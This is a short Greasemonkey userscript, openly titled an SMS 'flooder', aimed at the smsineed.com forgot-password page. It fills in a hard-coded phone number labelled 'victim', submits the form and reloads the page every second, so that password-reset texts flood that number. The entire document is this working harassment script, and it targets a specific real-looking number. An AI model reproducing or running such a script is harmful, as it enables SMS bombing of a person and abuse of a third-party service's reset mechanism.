// ==UserScript==>
// @name          Anonymous SMSINEED.COM flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*smsineed.com/*
// @credits       One
// ==/UserScript==

var victim=9953763381 //
var delay=1000; // Enter delay in milliseconds if required

if(document.location=="http://www1.smsineed.com/Forgotpassword.aspx"||document.location=="http://www1.smsineed.com/Forgotpassword.aspx")
{
document.getElementById('ctl00_ContentPlaceHolder1_txtmobileno').value=victim;
document.getElementById('ctl00_ContentPlaceHolder1_btnsubmit').click();
}
if(document.location=="http://www1.smsineed.com/Forgotpassword.aspx"||document.location=="http://www1.smsineed.com/Forgotpassword.aspx")
setTimeout("document.location='http://www1.smsineed.com/Forgotpassword.aspx'",delay);
